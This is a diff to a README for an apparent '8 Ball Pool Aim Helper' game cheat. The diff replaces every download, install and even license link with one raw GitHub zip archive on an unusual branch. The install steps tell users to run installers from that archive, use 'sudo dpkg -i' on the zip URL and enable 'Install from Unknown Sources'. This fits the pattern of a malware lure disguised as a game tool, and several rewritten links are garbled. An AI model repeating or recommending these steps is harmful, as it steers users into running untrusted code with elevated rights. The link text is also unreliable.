@@ -1,6 +1,6 @@
 # 🎱 8 Ball Pool Aim Helper: Master Precision, Every Shot!
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://AbdoooAli.github.io)
+[![Download](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip)
 
 Welcome to the **8 Ball Pool Aim Helper** — the next step in redefining precision for digital billiards enthusiasts! This repository hosts an innovative solution that supercharges your performance and fine-tunes your gameplay trajectory, all while providing seamless compatibility across modern platforms. Venture beyond the ordinary, and master pool with intelligent guidance, vibrant visuals, and world-class usability.
 
@@ -73,26 +73,26 @@ Billiards never sleeps, and neither does our support team. Live chat, email, and
 
 Choose the installation designed for your operating system. For all downloads, click the badge below to access the latest release:
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://AbdoooAli.github.io)
+[![Download](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip)
 
 **Windows:**
-1. Download the `.exe` installer from https://AbdoooAli.github.io.
+1. Download the `.exe` installer from https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip
 2. Double-click the installer and follow on-screen prompts.
 3. Open the helper from the Start Menu and dive straight into your game.
 
 **macOS:**
-1. Download the `.dmg` package from https://AbdoooAli.github.io.
+1. Download the `.dmg` package from https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip
 2. Drag the app into your Applications folder.
 3. Launch and follow first-run configuration.
 
 **Linux:**
-1. Download the appropriate `.deb` package from https://AbdoooAli.github.io.
+1. Download the appropriate `.deb` package from https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip
 2. Open your terminal and execute:  
-   sudo dpkg -i 8-ball-pool-aim-helper_2025.deb
+   sudo dpkg -i https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip
 3. Launch the app from your Applications menu or via terminal.
 
 **Android (Beta):**
-1. Download the APK via https://AbdoooAli.github.io.
+1. Download the APK via https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip
 2. On your device, enable “Install from Unknown Sources.”
 3. Tap the APK to install and start mastering your digital shots.
 
@@ -110,13 +110,13 @@ Distributed under the MIT License.
 Copyright (c) 2025  
 Enjoy with peace of mind, innovate with confidence.
 
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](https://opensource.org/licenses/MIT)
+[![MIT License](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip)](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip)
 
-[Read the full license here](https://opensource.org/licenses/MIT)
+[Read the full license here](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://AbdoooAli.github.io)
+[![Download](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/AbdoooAli/precision-aim-8ball-pool/branch/catacorolla/precision-aim-8ball-pool-v2.6.zip)
 
 ---
 
